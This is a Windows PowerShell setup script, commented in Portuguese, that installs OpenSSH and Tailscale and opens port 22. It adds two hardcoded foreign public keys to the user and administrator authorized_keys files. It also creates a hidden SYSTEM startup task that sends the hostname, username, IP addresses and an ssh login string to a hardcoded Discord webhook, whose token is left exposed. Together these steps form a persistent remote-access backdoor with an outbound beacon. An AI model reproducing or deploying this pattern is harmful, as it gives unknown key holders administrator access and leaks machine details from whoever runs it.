# ==============================================================================
# Script de Automacao: OpenSSH Server + Tailscale + Discord Webhook no Windows
# ==============================================================================

$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1553056796753793044/u7-bFZyCB3420pHAbopfwuT8gGAX3i8BWDSq2yMiXo-XHU6Bw0PANjFBUhZUdy9yNMW_"

# Funcao para mandar mensagem no Discord
function Send-DiscordMessage {
    param([string]$Message)
    try {
        $body = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $body -ErrorAction Stop
    } catch {
        Write-Warning "Nao foi possivel enviar mensagem ao Discord: $_"
    }
}

# Funcao para montar e enviar o embed do Discord com os dados da maquina
function Send-MachineInfo {
    param([string]$TailscaleIp, [string]$Context = "setup")

    $hostname   = $env:COMPUTERNAME
    $username   = $env:USERNAME
    $osInfo     = (Get-CimInstance Win32_OperatingSystem).Caption
    $localIp    = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*Tailscale*" } | Select-Object -First 1).IPAddress

    if ($Context -eq "setup") {
        $title       = "✅ Novo servidor configurado!"
        $description = "Maquina configurada com sucesso e pronta para conexao."
        $color       = 3066993  # verde
    } else {
        $title       = "🟢 Servidor online"
        $description = "A maquina foi ligada e o servidor SSH esta ativo."
        $color       = 3447003  # azul
    }

    if (-not $TailscaleIp) { $TailscaleIp = "(aguardando Tailscale)" }

    $embed = @{
        embeds = @(@{
            title       = $title
            description = $description
            color       = $color
            fields      = @(
                @{ name = "🖥️ Hostname";       value = $hostname;     inline = $true  }
                @{ name = "👤 Usuario";         value = $username;     inline = $true  }
                @{ name = "🌐 IP Tailscale";    value = "``$TailscaleIp``"; inline = $false }
                @{ name = "🏠 IP Local";        value = "``$localIp``";     inline = $true  }
                @{ name = "💻 Sistema";         value = $osInfo;       inline = $false }
            )
            footer      = @{ text = "Para conectar: ssh $username@$TailscaleIp" }
            timestamp   = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $embed -ErrorAction Stop
        Write-Host "Notificacao enviada para o Discord!" -ForegroundColor Green
    } catch {
        Write-Warning "Nao foi possivel enviar embed ao Discord: $_"
    }
}

# ==============================================================================

# 1. Verificar se esta rodando como Administrador
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host " ERRO: Voce PRECISA rodar como Administrador!" -ForegroundColor Yellow
    Write-Host " Clique com botao direito no arquivo run.bat" -ForegroundColor Yellow
    Write-Host " e escolha 'Executar como Administrador'." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Red
    Read-Host "Pressione ENTER para fechar..."
    exit 1
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "       INICIANDO CONFIGURACAO AUTOMATICA DO SERVIDOR       " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# 2. Instalar OpenSSH Server
Write-Host "`n=== [1/6] Verificando e instalando OpenSSH Server ===" -ForegroundColor Cyan
$sshCapability = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }
if ($sshCapability.State -ne 'Installed') {
    Write-Host "Instalando recurso OpenSSH Server..." -ForegroundColor Yellow
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
} else {
    Write-Host "OpenSSH Server ja esta instalado." -ForegroundColor Green
}

# 3. Iniciar servico SSHD e colocar em Automatico
Write-Host "`n=== [2/6] Configurando e iniciando o servico SSH ===" -ForegroundColor Cyan
Set-Service -Name sshd -StartupType 'Automatic'
Start-Service sshd
Write-Host "Servico SSH ativo e configurado para iniciar automaticamente." -ForegroundColor Green

# 4. Configurar Firewall
Write-Host "`n=== [3/6] Liberando porta 22 no Firewall do Windows ===" -ForegroundColor Cyan
if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH SSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
    Write-Host "Regra de firewall criada com sucesso." -ForegroundColor Green
} else {
    Set-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -Enabled True | Out-Null
    Write-Host "Regra de firewall ja existe e esta ativa." -ForegroundColor Green
}

# 5. Instalar Tailscale
Write-Host "`n=== [4/6] Instalando / Verificando Tailscale ===" -ForegroundColor Cyan
$tailscaleExe = "C:\Program Files\Tailscale\tailscale.exe"

if (-not (Test-Path $tailscaleExe)) {
    $altCmd = Get-Command tailscale.exe -ErrorAction SilentlyContinue
    if ($altCmd) { $tailscaleExe = $altCmd.Source }
}

if (-not (Test-Path $tailscaleExe)) {
    Write-Host "Instalando Tailscale..." -ForegroundColor Yellow
    $hasWinget = Get-Command winget.exe -ErrorAction SilentlyContinue
    if ($hasWinget) {
        winget install --id Tailscale.Tailscale --exact --accept-package-agreements --accept-source-agreements --silent
        Start-Sleep -Seconds 6
    }
    if (-not (Test-Path $tailscaleExe)) {
        Write-Host "Baixando instalador oficial do Tailscale..." -ForegroundColor Yellow
        $installerPath = "$env:TEMP\tailscale-setup.exe"
        Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile $installerPath
        Start-Process -FilePath $installerPath -ArgumentList "/quiet /install" -Wait
        Start-Sleep -Seconds 6
    }
}

# 6. Conectar Tailscale
Write-Host "`n=== [5/6] Conectando ao Tailscale ===" -ForegroundColor Cyan
if (Test-Path $tailscaleExe) {
    Write-Host "Iniciando Tailscale... Faca login no navegador se solicitado." -ForegroundColor Yellow
    & $tailscaleExe up --ssh --operator=$env:USERNAME
    Start-Sleep -Seconds 5
} else {
    Write-Warning "Tailscale nao encontrado. Instale manualmente se necessario."
}

# Pega IP do Tailscale
$tailscaleIp = ""
if (Test-Path $tailscaleExe) {
    try { $tailscaleIp = (& $tailscaleExe ip -4 2>$null).Trim() } catch {}
}

# 6. Configurar Chaves Publicas SSH
Write-Host "`n=== [6/6] Configurando Chaves SSH e Permissoes ===" -ForegroundColor Cyan

$sshKeys = @(
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwe7ftDRXOft6jm4mr/8dY5AFwDqghp50+FJ25/lNnj eliza@DESKTOP-N7QP8DV",
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHT9HYZVVRCkOvP3bLrZ1Z5a/81WFz7O9rFlJonvcAL hermes-ghufa@192.168.100.232"
)

$userSshDir  = Join-Path -Path $env:USERPROFILE -ChildPath ".ssh"
$userAuthKeys = Join-Path -Path $userSshDir -ChildPath "authorized_keys"
if (-not (Test-Path $userSshDir)) { New-Item -ItemType Directory -Path $userSshDir -Force | Out-Null }

$currentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

foreach ($key in $sshKeys) {
    if (-not (Test-Path $userAuthKeys) -or -not (Get-Content $userAuthKeys -ErrorAction SilentlyContinue | Select-String -SimpleMatch $key)) {
        Add-Content -Path $userAuthKeys -Value $key -Encoding UTF8
    }
}
icacls.exe $userAuthKeys /inheritance:r /grant "*S-1-5-18:(F)" /grant "$($currentUserSid):(F)" | Out-Null

$programDataSsh = "$env:ProgramData\ssh"
if (-not (Test-Path $programDataSsh)) { New-Item -ItemType Directory -Path $programDataSsh -Force | Out-Null }
$adminAuthKeys = "$programDataSsh\administrators_authorized_keys"

foreach ($key in $sshKeys) {
    if (-not (Test-Path $adminAuthKeys) -or -not (Get-Content $adminAuthKeys -ErrorAction SilentlyContinue | Select-String -SimpleMatch $key)) {
        Add-Content -Path $adminAuthKeys -Value $key -Encoding UTF8
    }
}
icacls.exe $adminAuthKeys /inheritance:r /grant "*S-1-5-18:(F)" /grant "*S-1-5-32-544:(F)" | Out-Null

Restart-Service sshd

# ==============================================================================
# CRIAR TAREFA AGENDADA: notifica Discord toda vez que o PC ligar
# ==============================================================================
Write-Host "`n=== Configurando notificacao automatica ao ligar o PC ===" -ForegroundColor Cyan

# Script de notificacao que sera salvo no disco para rodar no boot
$notifyScriptPath = "C:\ProgramData\ssh\notify-online.ps1"
$notifyScriptContent = @"
`$DISCORD_WEBHOOK = "$DISCORD_WEBHOOK"

function Send-MachineInfo {
    param([string]`$TailscaleIp)
    `$hostname = `$env:COMPUTERNAME
    `$username = `$env:USERNAME
    `$osInfo   = (Get-CimInstance Win32_OperatingSystem).Caption
    `$localIp  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$_.InterfaceAlias -notlike "*Loopback*" -and `$_.InterfaceAlias -notlike "*Tailscale*" } | Select-Object -First 1).IPAddress

    `$embed = @{
        embeds = @(@{
            title       = "🟢 Servidor online"
            description = "A maquina foi ligada e o servidor SSH esta ativo."
            color       = 3447003
            fields      = @(
                @{ name = "🖥️ Hostname";    value = `$hostname;            inline = `$true  }
                @{ name = "👤 Usuario";      value = `$username;            inline = `$true  }
                @{ name = "🌐 IP Tailscale"; value = "``````\`$TailscaleIp``````"; inline = `$false }
                @{ name = "🏠 IP Local";     value = "``````\`$localIp``````";     inline = `$true  }
                @{ name = "💻 Sistema";      value = `$osInfo;              inline = `$false }
            )
            footer    = @{ text = "Para conectar: ssh `$username@`$TailscaleIp" }
            timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri `$DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body `$embed -ErrorAction Stop
    } catch {}
}

# Aguarda o Tailscale estar pronto (max 60 seg)
`$tsExe = "C:\Program Files\Tailscale\tailscale.exe"
`$ip = ""
for (`$i = 0; `$i -lt 12; `$i++) {
    Start-Sleep -Seconds 5
    try { `$ip = (& `$tsExe ip -4 2>`$null).Trim() } catch {}
    if (`$ip) { break }
}

Send-MachineInfo -TailscaleIp `$ip
"@

Set-Content -Path $notifyScriptPath -Value $notifyScriptContent -Encoding UTF8

# Registra a tarefa agendada para rodar o script ao iniciar o Windows
$taskName = "SSHServerNotifyDiscord"
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$notifyScriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
Write-Host "Tarefa agendada criada: o Discord sera notificado automaticamente a cada boot!" -ForegroundColor Green

# ==============================================================================
# RESULTADO FINAL
# ==============================================================================
Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host "          CONFIGURACAO CONCLUIDA COM SUCESSO!             " -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Host ""
Write-Host "Enviando informacoes da maquina para o Discord..." -ForegroundColor Yellow

Send-MachineInfo -TailscaleIp $tailscaleIp -Context "setup"

Write-Host ""
Write-Host "Dados da maquina:" -ForegroundColor Yellow
Write-Host "----------------------------------------------------------"
Write-Host "Usuario:      $env:USERNAME" -ForegroundColor Cyan
if ($tailscaleIp) {
    Write-Host "IP Tailscale: $tailscaleIp" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Comando para conectar: ssh $env:USERNAME@$tailscaleIp" -ForegroundColor Green
} else {
    Write-Host "IP Tailscale: (Veja o IP no icone do Tailscale perto do relogio)" -ForegroundColor Yellow
}
Write-Host "----------------------------------------------------------"
Write-Host ""
Write-Host "O Discord ja recebeu a notificacao!" -ForegroundColor Green
Write-Host "E toda vez que esse PC ligar, vai notificar automaticamente!" -ForegroundColor Green
Write-Host ""
Write-Host "Pressione qualquer tecla para fechar..."
[void][System.Console]::ReadKey()
